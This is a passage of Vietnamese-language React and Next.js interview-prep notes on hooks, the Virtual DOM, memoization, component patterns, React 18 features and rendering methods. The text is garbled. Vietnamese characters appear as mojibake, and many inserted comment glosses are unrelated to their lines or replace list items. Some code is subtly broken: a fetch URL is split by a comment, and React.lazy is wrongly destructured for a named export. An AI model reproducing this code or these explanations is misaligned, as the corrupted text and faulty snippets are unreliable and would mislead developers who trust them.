 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
  // D√πng useLayoutEffect (ch·∫°y TR∆Ø·ªöC browser paint)
  useLayoutEffect(() => {
    const snapshot = listRef.current.scrollHeight;
 // Ch√∫ gi·∫£i: Update DOM synchronously
  }, [list]);
  
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: RENDER
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
  return <div>{count}</div>;
}

 // Ch√∫ gi·∫£i: Wrap v·ªõi React.memo cho shouldComponentUpdate behavior
export default React.memo(MyComponent, (prevProps, nextProps) => {
 // Trong arrow function v·ªõi block `{ }` ph·∫£i d√πng `return` ƒë·ªÉ tr·∫£ gi√° tr·ªã; v·ªõi expression c√≥ th·ªÉ tr·∫£ ng·∫ßm (implicit return).
  return prevProps.id === nextProps.id;
});
```

**üìä So s√°nh Class vs Functional:**

| Class Component | Functional Component |
|----------------|---------------------|
| `constructor` | `useState(() => initialValue)` |
| `componentDidMount` | `useEffect(() => {}, [])` |
| `componentDidUpdate` | `useEffect(() => {}, [deps])` |
| `componentWillUnmount` | `useEffect(() => { return cleanup }, [])` |
| `shouldComponentUpdate` | `React.memo(Component, areEqual)` |
| `getDerivedStateFromProps` | Compute trong render ho·∫∑c `useEffect` |
| `getSnapshotBeforeUpdate` | `useLayoutEffect` |
| `componentDidCatch` | Ch∆∞a c√≥ hook (d√πng Error Boundary class) |

---

#### **üìö PH·∫¶N 3: VIRTUAL DOM & PERFORMANCE**

---

##### **3.1. Virtual DOM & Reconciliation**

**üéØ Virtual DOM l√† g√¨:**
- JavaScript object ƒë·∫°i di·ªán cho Real DOM
- React t·∫°o Virtual DOM tree m·ªói khi state/props thay ƒë·ªïi
- So s√°nh (diffing) old Virtual DOM vs new Virtual DOM
- Ch·ªâ update nh·ªØng thay ƒë·ªïi th·ª±c s·ª± l√™n Real DOM

**üìñ Reconciliation Process:**

```typescript
 // Ch√∫ gi·∫£i: 1. Initial render
const vdom = { type: 'div', props: { className: 'box' }, children: ['Hello'] };
 // Ch√∫ gi·∫£i: ‚Üí React t·∫°o real DOM: <div class="box">Hello</div>

 // Ch√∫ gi·∫£i: 2. State changes
setState({ text: 'World' });

 // Ch√∫ gi·∫£i: 3. New Virtual DOM
const newVdom = { type: 'div', props: { className: 'box' }, children: ['World'] };

 // Ch√∫ gi·∫£i: 4. Diffing algorithm
 // Ch√∫ gi·∫£i: - Same type (div) ‚Üí keep element, update children
 // Ch√∫ gi·∫£i: - Different type ‚Üí destroy & re-create
 // Ch√∫ gi·∫£i: - Update: only text node changes

 // Ch√∫ gi·∫£i: 5. Commit phase: Update real DOM
element.textContent = 'World'; // Ch·ªâ update text, kh√¥ng re-create div
```

**üí° Key trong Lists - T·∫†I SAO QUAN TR·ªåNG:**

```typescript
// ‚ùå KH√îNG D√ôNG INDEX l√†m key
{items.map((item, index) => <Item key={index} data={item} />)}
// Problem: Khi th√™m/x√≥a item ‚Üí index thay ƒë·ªïi ‚Üí React re-render sai items

// Example: [A, B, C] ‚Üí X√≥a A ‚Üí [B, C]
// React nghƒ©: B c√≥ key=0 ‚Üí gi·ªØ nguy√™n (SAI! B gi·ªù c√≥ key=1)
//            C c√≥ key=1 ‚Üí gi·ªØ nguy√™n (SAI! C gi·ªù c√≥ key=0)
 // Ch√∫ gi·∫£i: ‚Üí Input values, scroll position, animations B·ªä LO·∫†N

// ‚úÖ D√ôNG STABLE UNIQUE ID
{items.map(item => <Item key={item.id} data={item} />)}
// React bi·∫øt ch√≠nh x√°c item n√†o added/removed/moved
```

**‚ö†Ô∏è Khi n√†o ƒë∆∞·ª£c d√πng index:**
- List KH√îNG bao gi·ªù thay ƒë·ªïi order (static)
- Kh√¥ng c√≥ filter/sort
- Items kh√¥ng c√≥ unique ID

---

##### **3.2. PureComponent vs React.memo**

**üéØ PureComponent (Class):**

```typescript
 // Sao ch√©p n√¥ng: ch·ªâ sao ch√©p thu·ªôc t√≠nh c·∫•p tr√™n; object l·ªìng b√™n trong v·∫´n gi·ªØ tham chi·∫øu chung.
class MyComponent extends React.PureComponent {
  render() {
    return <div>{this.props.name}</div>;
  }
}

 // Ch√∫ gi·∫£i: Equivalent to:
class MyComponent extends React.Component {
  shouldComponentUpdate(nextProps, nextState) {
    return !shallowEqual(this.props, nextProps) || 
           !shallowEqual(this.state, nextState);
  }
}

 // Sao ch√©p n√¥ng: ch·ªâ sao ch√©p thu·ªôc t√≠nh c·∫•p tr√™n; object l·ªìng b√™n trong v·∫´n gi·ªØ tham chi·∫øu chung.
// { a: 1 } !== { a: 1 } ‚Üí re-render (m·∫∑c d√π gi·ªëng nhau)
 // Ch√∫ gi·∫£i: [1,2,3] !== [1,2,3] ‚Üí re-render
```

**üéØ React.memo (Functional):**

```typescript
 // Sao ch√©p n√¥ng: ch·ªâ sao ch√©p thu·ªôc t√≠nh c·∫•p tr√™n; object l·ªìng b√™n trong v·∫´n gi·ªØ tham chi·∫øu chung.
const MyComponent = React.memo(({ name, age }) => {
  return <div>{name} - {age}</div>;
});

 // Ch√∫ gi·∫£i: Custom comparison
const MyComponent = React.memo(
  ({ user }) => <div>{user.name}</div>,
  (prevProps, nextProps) => {
    return prevProps.user.id === nextProps.user.id; // Ch√∫ gi·∫£i: true = skip render
  }
);

 // Ch√∫ gi·∫£i: Combine v·ªõi useMemo/useCallback
function Parent() {
  const [count, setCount] = useState(0);
  const [name, setName] = useState('');
  
 // Tham chi·∫øu: bi·∫øn ch·ª©a ƒë·ªãa ch·ªâ t·ªõi object trong heap; `const` kh√≥a tham chi·∫øu ch·ª© kh√¥ng kh√≥a n·ªôi dung object.
  const config = useMemo(() => ({ theme: 'dark' }), []);
  const handleClick = useCallback(() => {}, []);
  
  return (
    <>
      <input value={name} onChange={e => setName(e.target.value)} />
      <Child config={config} onClick={handleClick} /> {/* Kh√¥ng re-render */}
    </>
  );
}

const Child = React.memo(({ config, onClick }) => {
  console.log('Child rendered');
  return <button onClick={onClick}>{config.theme}</button>;
});
```

---

##### **3.3. state vs props & Parent/Child Re-rendering**

**üìñ state vs props:**

```typescript
 // Mutable (c√≥ th·ªÉ thay ƒë·ªïi): thu·ªôc t√≠nh object ho·∫∑c ph·∫ßn t·ª≠ m·∫£ng c√≥ th·ªÉ b·ªã s·ª≠a tr·ª±c ti·∫øp; n·∫øu c·∫ßn b·∫•t bi·∫øn, d√πng `Object.freeze()` (ch·ªâ n√¥ng) ho·∫∑c pattern/ th∆∞ vi·ªán b·∫•t bi·∫øn.
const [count, setCount] = useState(0); // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh.

 // Ch√∫ gi·∫£i: PROPS: Passed from parent, READ-ONLY
function Child({ count }) { // Ch√∫ gi·∫£i: Cannot modify count
 // Ch√∫ gi·∫£i: count = 10; // ‚ùå Error!
  return <div>{count}</div>;
}

 // Ch√∫ gi·∫£i: Data flow: Parent state ‚Üí Child props (one-way)
function Parent() {
  const [count, setCount] = useState(0);
  return <Child count={count} />; // Ch√∫ gi·∫£i: Pass state as props
}
```

**üìñ Parent re-render ‚Üí Child re-render?**

```typescript
 // Ch√∫ gi·∫£i: ‚úÖ YES: Default behavior
function Parent() {
  const [count, setCount] = useState(0);
  return (
    <>
      <button onClick={() => setCount(count + 1)}>Increment</button>
      <Child /> {/* Re-render ngay c·∫£ khi kh√¥ng c√≥ props! */}
    </>
  );
}

 // Ch√∫ gi·∫£i: üîß Optimization 1: React.memo
const Child = React.memo(() => {
  console.log('Child rendered');
  return <div>Child</div>;
}); // Kh√¥ng re-render n·∫øu props kh√¥ng ƒë·ªïi

 // Ch√∫ gi·∫£i: üîß Optimization 2: children prop
function Parent() {
  const [count, setCount] = useState(0);
  return (
    <Layout>
      <Child /> {/* Kh√¥ng re-render! */}
    </Layout>
  );
}

function Layout({ children }) {
  const [theme, setTheme] = useState('light');
  return <div className={theme}>{children}</div>;
  // children l√† stable reference ‚Üí kh√¥ng re-create
}

 // Ch√∫ gi·∫£i: üîß Optimization 3: Component composition
function Parent() {
  const child = useMemo(() => <Child />, []); // Ch√∫ gi·∫£i: Cache element
  return <div>{child}</div>;
}
```

---

#### **üìö PH·∫¶N 4: ADVANCED PATTERNS**

---

##### **4.1. Higher-Order Components (HOC)**

```typescript
 // Trong arrow function v·ªõi block `{ }` ph·∫£i d√πng `return` ƒë·ªÉ tr·∫£ gi√° tr·ªã; v·ªõi expression c√≥ th·ªÉ tr·∫£ ng·∫ßm (implicit return).
function withLoading(Component) {
  return function WithLoadingComponent({ isLoading, ...props }) {
    if (isLoading) return <div>Loading...</div>;
    return <Component {...props} />;
  };
}

 // Ch√∫ gi·∫£i: Usage
const UserListWithLoading = withLoading(UserList);
<UserListWithLoading isLoading={true} users={[]} />

 // Ch√∫ gi·∫£i: HOC for authentication
function withAuth(Component) {
  return function AuthComponent(props) {
    const { user } = useAuth();
    if (!user) return <Navigate to="/login" />;
    return <Component {...props} user={user} />;
  };
}
```

---

##### **4.2. Render Props**

```typescript
 // Ch√∫ gi·∫£i: Component v·ªõi function as child
function DataFetcher({ url, render }) {
  const [data, setData] = useState(null);
  const [loading, setLoading] = useState(true);
  
  useEffect(() => {
    fetch(url).then(res => res.json()).then(data => {
      setData(data);
      setLoading(false);
    });
  }, [url]);
  
  return render({ data, loading });
}

 // Ch√∫ gi·∫£i: Usage
<DataFetcher 
  url="/api/users"
  render={({ data, loading }) => (
    loading ? <Spinner /> : <UserList users={data} />
  )}
/>

 // Ch√∫ gi·∫£i: Modern alternative: Custom hooks
function useDataFetch(url) {
  const [data, setData] = useState(null);
  const [loading, setLoading] = useState(true);
  useEffect(() => { /* fetch logic */ }, [url]);
  return { data, loading };
}

function UserList() {
  const { data, loading } = useDataFetch('/api/users');
  if (loading) return <Spinner />;
  return <ul>{data.map(user => <li key={user.id}>{user.name}</li>)}</ul>;
}
```

---

##### **4.3. Compound Components**

```typescript
// Components ho·∫°t ƒë·ªông c√πng nhau qua Context
const TabsContext = createContext();

function Tabs({ children, defaultTab }) {
  const [activeTab, setActiveTab] = useState(defaultTab);
  return (
    <TabsContext.Provider value={{ activeTab, setActiveTab }}>
      {children}
    </TabsContext.Provider>
  );
}

function TabList({ children }) {
  return <div className="tab-list">{children}</div>;
}

function Tab({ id, children }) {
  const { activeTab, setActiveTab } = useContext(TabsContext);
  return (
    <button 
      className={activeTab === id ? 'active' : ''}
      onClick={() => setActiveTab(id)}
    >
      {children}
    </button>
  );
}

function TabPanel({ id, children }) {
  const { activeTab } = useContext(TabsContext);
  return activeTab === id ? <div>{children}</div> : null;
}

 // Ch√∫ gi·∫£i: Usage (flexible API)
<Tabs defaultTab="home">
  <TabList>
    <Tab id="home">Home</Tab>
    <Tab id="profile">Profile</Tab>
  </TabList>
  <TabPanel id="home">Home content</TabPanel>
  <TabPanel id="profile">Profile content</TabPanel>
</Tabs>
```

---

#### **üìö PH·∫¶N 5: REACT FEATURES**

---

##### **5.1. React Batching (Automatic in React 18+)**

```typescript
 // Ch√∫ gi·∫£i: React 17: Ch·ªâ batch trong event handlers
function handleClick() {
  setCount(c => c + 1);
  setFlag(f => !f);
 // Ch√∫ gi·∫£i: ‚Üí 1 re-render (batched)
}

setTimeout(() => {
  setCount(c => c + 1);
  setFlag(f => !f);
  // ‚Üí 2 re-renders (KH√îNG batch)
}, 1000);

 // Ch√∫ gi·∫£i: React 18: Automatic batching m·ªçi n∆°i
setTimeout(() => {
  setCount(c => c + 1);
  setFlag(f => !f);
  // ‚Üí 1 re-render (batched t·ª± ƒë·ªông)
}, 1000);

 // Ch√∫ gi·∫£i: Opt-out batching
import { flushSync } from 'react-dom';

flushSync(() => {
  setCount(c => c + 1);
}); // Ch√∫ gi·∫£i: Render immediately
setFlag(f => !f); // Ch√∫ gi·∫£i: Render again
```

---

##### **5.2. Code Splitting & Lazy Loading**

```typescript
 // Ch√∫ gi·∫£i: Route-based splitting
const Home = lazy(() => import('./Home'));
const About = lazy(() => import('./About'));

function App() {
  return (
    <Suspense fallback={<Spinner />}>
      <Routes>
        <Route path="/" element={<Home />} />
        <Route path="/about" element={<About />} />
      </Routes>
    </Suspense>
  );
}

 // Ch√∫ gi·∫£i: Component-based splitting
const HeavyChart = lazy(() => import('./HeavyChart'));

function Dashboard() {
  const [showChart, setShowChart] = useState(false);
  return (
    <>
      <button onClick={() => setShowChart(true)}>Show Chart</button>
      {showChart && (
        <Suspense fallback={<div>Loading chart...</div>}>
          <HeavyChart />
        </Suspense>
      )}
    </>
  );
}

 // Ch√∫ gi·∫£i: Named exports
const { TabPanel } = lazy(() => 
  import('./Tabs').then(module => ({ default: module.TabPanel }))
);
```

---

##### **5.3. React Portal**

```typescript
// Render children v√†o DOM node kh√°c (ngo√†i parent hierarchy)
function Modal({ children, isOpen }) {
  if (!isOpen) return null;
  
  return createPortal(
    <div className="modal-overlay">
      <div className="modal">{children}</div>
    </div>,
    document.getElementById('modal-root') // Ch√∫ gi·∫£i: Target container
  );
}

 // Ch√∫ gi·∫£i: index.html
<body>
  <div id="root"></div>
  <div id="modal-root"></div> <!-- Portal target -->
</body>

 // Ch√∫ gi·∫£i: Use cases:
 // Ch√∫ gi·∫£i: - Modals, Dialogs
 // Ch√∫ gi·∫£i: - Tooltips, Popovers
 // Ch√∫ gi·∫£i: - Notifications (toast)
```

---

##### **5.4. Error Boundaries**

```typescript
// Ch·ªâ c√≥ th·ªÉ d√πng Class Component (ch∆∞a c√≥ hook)
class ErrorBoundary extends React.Component {
  state = { hasError: false, error: null };
  
  static getDerivedStateFromError(error) {
    return { hasError: true, error };
  }
  
  componentDidCatch(error, errorInfo) {
    logErrorToService(error, errorInfo);
  }
  
  render() {
    if (this.state.hasError) {
      return <ErrorFallback error={this.state.error} />;
    }
    return this.props.children;
  }
}

 // Ch√∫ gi·∫£i: Usage
<ErrorBoundary>
  <App />
</ErrorBoundary>

// ‚ö†Ô∏è Error boundaries KH√îNG catch:
// - Event handlers (d√πng try/catch)
 // `Promise`: c√°ch bi·ªÉu di·ªÖn gi√° tr·ªã b·∫•t ƒë·ªìng b·ªô; d√πng `.then/.catch` ho·∫∑c `async/await` ƒë·ªÉ x·ª≠ l√Ω. `setTimeout`/`setInterval` n·∫±m trong macrotasks; nh·ªõ clear khi kh√¥ng c·∫ßn ƒë·ªÉ tr√°nh r√≤ r·ªâ b·ªô nh·ªõ.
 // Ch√∫ gi·∫£i: - Server-side rendering
 // Ch√∫ gi·∫£i: - Errors trong Error Boundary itself
```

---

#### **üìö PH·∫¶N 6: REACT 18+ FEATURES**

---

##### **6.1. Suspense for Data Fetching**

```typescript
 // Ch√∫ gi·∫£i: Suspense-enabled data fetching
const resource = fetchData('/api/users'); // Trong arrow function v·ªõi block `{ }` ph·∫£i d√πng `return` ƒë·ªÉ tr·∫£ gi√° tr·ªã; v·ªõi expression c√≥ th·ªÉ tr·∫£ ng·∫ßm (implicit return).

function UserList() {
  const users = resource.read(); // Ch√∫ gi·∫£i: Suspends if not ready
  return <ul>{users.map(u => <li key={u.id}>{u.name}</li>)}</ul>;
}

function App() {
  return (
    <Suspense fallback={<Spinner />}>
      <UserList /> {/* Suspends while loading */}
    </Suspense>
  );
}

 // Ch√∫ gi·∫£i: Libraries h·ªó tr·ª£: React Query, SWR, Relay
```

---

##### **6.2. Server Components (React 18+)**

```typescript
 // Ch√∫ gi·∫£i: Server Component (.server.jsx)
async function UserProfile({ userId }) {
  const user = await db.users.findById(userId); // Ch√∫ gi·∫£i: Direct DB access!
  return <div>{user.name}</div>;
}

 // Ch√∫ gi·∫£i: Client Component (.client.jsx)
'use client';
function Counter() {
  const [count, setCount] = useState(0);
  return <button onClick={() => setCount(count + 1)}>{count}</button>;
}

 // Ch√∫ gi·∫£i: Benefits:
// - Zero bundle size (server components kh√¥ng ship JS)
 // Ch√∫ gi·∫£i: - Direct backend access (DB, filesystem)
 // Ch√∫ gi·∫£i: - Automatic code splitting
```

---

##### **6.3. Concurrent Rendering - useTransition & useDeferredValue**

```typescript
 // Ch√∫ gi·∫£i: useTransition: Mark updates as non-urgent
function SearchBox() {
  const [query, setQuery] = useState('');
  const [isPending, startTransition] = useTransition();
  
  const handleChange = (e) => {
    setQuery(e.target.value); // Ch√∫ gi·∫£i: Urgent: update input
    
    startTransition(() => {
      setSearchResults(e.target.value); // Ch√∫ gi·∫£i: Non-urgent: can interrupt
    });
  };
  
  return (
    <>
      <input value={query} onChange={handleChange} />
      {isPending && <Spinner />}
      <Results />
    </>
  );
}

 // Ch√∫ gi·∫£i: useDeferredValue: Defer value updates
function App() {
  const [text, setText] = useState('');
  const deferredText = useDeferredValue(text); // Ch√∫ gi·∫£i: Lags behind
  
  return (
    <>
      <input value={text} onChange={e => setText(e.target.value)} />
      <SlowList text={deferredText} /> {/* Uses old value while busy */}
    </>
  );
}
```

---

##### **6.4. Hydration (SSR/Next.js)**

```typescript
 // Ch√∫ gi·∫£i: Server-side: Generate HTML
const html = renderToString(<App />);
 // Ch√∫ gi·∫£i: Send HTML to client ‚Üí User sees content immediately

 // Ch√∫ gi·∫£i: Client-side: Hydrate (attach event listeners)
hydrateRoot(document.getElementById('root'), <App />);

 // Ch√∫ gi·∫£i: React 18: Selective Hydration
<Suspense fallback={<Spinner />}>
  <Comments /> {/* Hydrate sau khi ready */}
</Suspense>
// User c√≥ th·ªÉ interact v·ªõi page kh√°c ngay l·∫≠p t·ª©c
```

---

#### **üìö PH·∫¶N 7: ROUTING & MISC**

---

##### **7.1. React Router**

```typescript
import { BrowserRouter, Routes, Route, Link, useParams, useNavigate } from 'react-router-dom';

function App() {
  return (
    <BrowserRouter>
      <nav>
        <Link to="/">Home</Link>
        <Link to="/about">About</Link>
        <Link to="/users/123">User 123</Link>
      </nav>
      
      <Routes>
        <Route path="/" element={<Home />} />
        <Route path="/about" element={<About />} />
        <Route path="/users/:id" element={<User />} />
        <Route path="*" element={<NotFound />} /> {/* 404 */}
      </Routes>
    </BrowserRouter>
  );
}

function User() {
  const { id } = useParams(); // Ch√∫ gi·∫£i: Get URL params
  const navigate = useNavigate(); // Ch√∫ gi·∫£i: Programmatic navigation
  
  return (
    <>
      <h1>User {id}</h1>
      <button onClick={() => navigate('/about')}>Go to About</button>
    </>
  );
}
```

---

##### **7.2. Fragments**

```typescript
 // Ch√∫ gi·∫£i: Avoid extra DOM nodes
function List() {
  return (
    <>
      <li>Item 1</li>
      <li>Item 2</li>
    </> // Ch√∫ gi·∫£i: No wrapper div in DOM
  );
}

 // Ch√∫ gi·∫£i: With key (trong loops)
{items.map(item => (
  <React.Fragment key={item.id}>
    <dt>{item.term}</dt>
    <dd>{item.description}</dd>
  </React.Fragment>
))}
```

---

##### **7.3. startTransition (React 18)**

```typescript
import { startTransition } from 'react';

 // Ch√∫ gi·∫£i: Mark state updates as non-urgent
function TabContainer() {
  const [tab, setTab] = useState('home');
  
  function selectTab(nextTab) {
    startTransition(() => {
      setTab(nextTab); // Ch√∫ gi·∫£i: Low priority
    });
  }
  
 // Ch√∫ gi·∫£i: Input stays responsive even if TabPanel render is slow
}
```

---

##### **7.4. React.lazy & Suspense Integration**

```typescript
const OtherComponent = lazy(() => import('./OtherComponent'));

function MyComponent() {
  return (
    <Suspense fallback={<div>Loading...</div>}>
      <OtherComponent />
    </Suspense>
  );
}

 // Ch√∫ gi·∫£i: Multiple lazy components
<Suspense fallback={<Spinner />}>
  <ComponentA />
  <ComponentB />
</Suspense>
 // Ch√∫ gi·∫£i: Waits for BOTH before showing (avoid cascading spinners)
```

---
---
## 26. ‚ñ≤ Q26: Next.js - React Framework for Production  

**P1: T√™n c√¢u h·ªèi:** ‚ñ≤ Q26: Next.js - React Framework for Production  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (2-3 ph√∫t):**

**"Next.js l√† framework React v·ªõi SSR, SSG, routing v√† t·ªëi ∆∞u h√≥a t√≠ch h·ª£p s·∫µn.**

**üì¶ Ph∆∞∆°ng Ph√°p Render C·ªët L√µi (4 Lo·∫°i):**
1. **SSR (Server-Side Rendering - Render Ph√≠a Server)**: Render HTML m·ªói request ‚Üí d·ªØ li·ªáu m·ªõi, SEO t·ªët. D√πng `getServerSideProps()`.
   - ‚úÖ Tr∆∞·ªùng h·ª£p: Dashboard, trang c√° nh√¢n, d·ªØ li·ªáu th·ªùi gian th·ª±c.
   - ‚ö†Ô∏è ƒê√°nh ƒë·ªïi: TTFB ch·∫≠m h∆°n, t·∫£i server cao.

2. **SSG (Static Site Generation - T·∫°o Trang Tƒ©nh)**: Render HTML l√∫c build ‚Üí ph·ª•c v·ª• file tƒ©nh (c·ª±c nhanh). D√πng `getStaticProps()`.
   - ‚úÖ Tr∆∞·ªùng h·ª£p: Blog, t√†i li·ªáu, trang marketing (n·ªôi dung √≠t thay ƒë·ªïi).
   - ‚úÖ L·ª£i √≠ch: Th√¢n thi·ªán CDN, hi·ªáu nƒÉng t·ªët nh·∫•t, SEO t·ªët.

3. **ISR (Incremental Static Regeneration - T·∫°o Tƒ©nh TƒÉng D·∫ßn)**: SSG + t·∫°o l·∫°i n·ªÅn ‚Üí m·∫´u stale-while-revalidate.
   - `revalidate: 60` ‚Üí t·∫°o l·∫°i trang m·ªói 60s n·∫øu c√≥ request.
   - ‚úÖ T·ªët nh·∫•t c·∫£ hai: T·ªëc ƒë·ªô tƒ©nh + d·ªØ li·ªáu m·ªõi.

4. **CSR (Client-Side Rendering - Render Ph√≠a Client)**: L·∫•y d·ªØ li·ªáu tr√™n client (nh∆∞ SPA). D√πng `useSWR` ho·∫∑c React Query.
   - ‚úÖ Tr∆∞·ªùng h·ª£p: Trang ri√™ng t∆∞, dashboard ng∆∞·ªùi d√πng.
   - ‚ö†Ô∏è ƒê√°nh ƒë·ªïi: Kh√¥ng SEO, t·∫£i ban ƒë·∫ßu ch·∫≠m h∆°n.

**üóÇÔ∏è App Router vs Pages Router:**
- **Pages Router (C≈©):**
  - Routing d·ª±a tr√™n file: `pages/about.tsx` ‚Üí `/about`.
  - `getServerSideProps`, `getStaticProps` cho l·∫•y d·ªØ li·ªáu.
  - Ch·ªâ Client Components.

- **App Router (Next.js 13+):**
  - D·ª±a tr√™n th∆∞ m·ª•c: `app/about/page.tsx` ‚Üí `/about`.
  - Server Components m·∫∑c ƒë·ªãnh ‚Üí kh√¥ng c√≥ JS bundle.
  - Layouts, loading, error states t√≠ch h·ª£p s·∫µn.
  - `async/await` tr·ª±c ti·∫øp trong components (kh√¥ng c·∫ßn getServerSideProps).
  - Routing l·ªìng nhau, parallel routes, intercepting routes.

**‚ö° Server Components vs Client Components:**
- **Server Components**: Render tr√™n server ‚Üí kh√¥ng g·ª≠i JS t·ªõi client ‚Üí t·∫£i nhanh h∆°n, SEO t·ªët h∆°n.
  - M·∫∑c ƒë·ªãnh trong App Router.
  - Kh√¥ng d√πng ƒë∆∞·ª£c hooks (useState, useEffect), browser APIs.
  - ‚úÖ Tr∆∞·ªùng h·ª£p: N·ªôi dung tƒ©nh, l·∫•y d·ªØ li·ªáu, trang SEO.

- **Client Components**: Ch·ªâ th·ªã `'use client'` ‚Üí render tr√™n client ‚Üí t∆∞∆°ng t√°c ƒë∆∞·ª£c.
  - D√πng ƒë∆∞·ª£c hooks, browser APIs, event handlers.
  - ‚úÖ Tr∆∞·ªùng h·ª£p: Form, giao di·ªán t∆∞∆°ng t√°c, state client.

**üéØ T√≠nh NƒÉng Ch√≠nh:**
- **Routing D·ª±a Tr√™n File**: Kh√¥ng c·∫ßn config, t·ª± ƒë·ªông chia code theo route.
- **T·ªëi ∆Øu H√¨nh ·∫¢nh**: Component `<Image>` ‚Üí t·ª± ƒë·ªông resize, lazy load, WebP.
- **API Routes**: `pages/api/` ho·∫∑c `app/api/` ‚Üí serverless functions.
- **Middleware**: Ch·∫°y code tr∆∞·ªõc khi request ho√†n th√†nh ‚Üí auth, redirects, rewrites.
- **Chia Code T·ª± ƒê·ªông**: Ch·ªâ t·∫£i JS cho trang hi·ªán t·∫°i ‚Üí t·∫£i nhanh h∆°n.

**‚ö†Ô∏è L·ªói Th∆∞·ªùng G·∫∑p:**
- **L·∫•y d·ªØ li·ªáu trong useEffect (CSR) khi c√≥ th·ªÉ d√πng SSR/SSG**: B·ªè l·ª° l·ª£i √≠ch SEO.
- **Kh√¥ng d√πng `next/image`**: B·ªè l·ª° t·ªëi ∆∞u t·ª± ƒë·ªông (resize, lazy load, WebP).
- **Hardcode URLs**: D√πng `next/link` + `next/router` cho SPA navigation.
- **Kh√¥ng t·ªëi ∆∞u fonts**: D√πng `next/font` cho t·ªëi ∆∞u font t·ª± ƒë·ªông.

**üí° Ki·∫øn Th·ª©c Senior:**
- **Rendering H·ªón H·ª£p**: K·∫øt h·ª£p SSR + SSG + CSR trong c√πng app ‚Üí ch·ªçn ph∆∞∆°ng ph√°p cho t·ª´ng trang.
- **Edge Runtime**: Deploy middleware/API routes tr√™n Edge ‚Üí ƒë·ªô tr·ªÖ th·∫•p to√†n c·∫ßu.
- **Streaming SSR**: React 18 + App Router ‚Üí stream HTML chunks ‚Üí TTFB nhanh h∆°n.
- **Partial Prerendering**: Next.js 14+ ‚Üí v·ªè tƒ©nh + n·ªôi dung ƒë·ªông streamed.
- **Turbopack**: Next.js 13+ dev server ‚Üí bundler d·ª±a tr√™n Rust ‚Üí nhanh h∆°n Webpack 700 l·∫ßn.

**üöÄ M·∫πo Hi·ªáu NƒÉng:**
- **Prefetching**: `<Link>` t·ª± ƒë·ªông prefetch khi hover ‚Üí chuy·ªÉn trang t·ª©c th√¨.
- **Import ƒê·ªông**: `next/dynamic` ƒë·ªÉ chia code ‚Üí t·∫£i components theo y√™u c·∫ßu.
- **Caching**: `revalidate` cho ISR, headers `Cache-Control` cho API routes.
- **Ph√¢n T√≠ch**: B√°o c√°o Web Vitals t√≠ch h·ª£p ‚Üí theo d√µi hi·ªáu nƒÉng ng∆∞·ªùi d√πng th·ª±c.

---

**üéØ Next.js l√† g√¨:**
- React framework for production v·ªõi built-in routing, SSR, SSG, API routes
- T·ªëi ∆∞u performance, SEO, developer experience
- Zero-config, file-based routing, automatic code splitting

#### **üìö PH·∫¶N 1: CORE FEATURES**

##### **1.1. Rendering Methods**

```typescript
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: 1. SSR - Server-Side Rendering (m·ªói request)
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
// Ch·∫°y tr√™n server M·ªñI request ‚Üí Fresh data, t·ªët cho SEO
export async function getServerSideProps(context) {
  const res = await fetch('https: // Ch√∫ gi·∫£i: api.example.com/data');
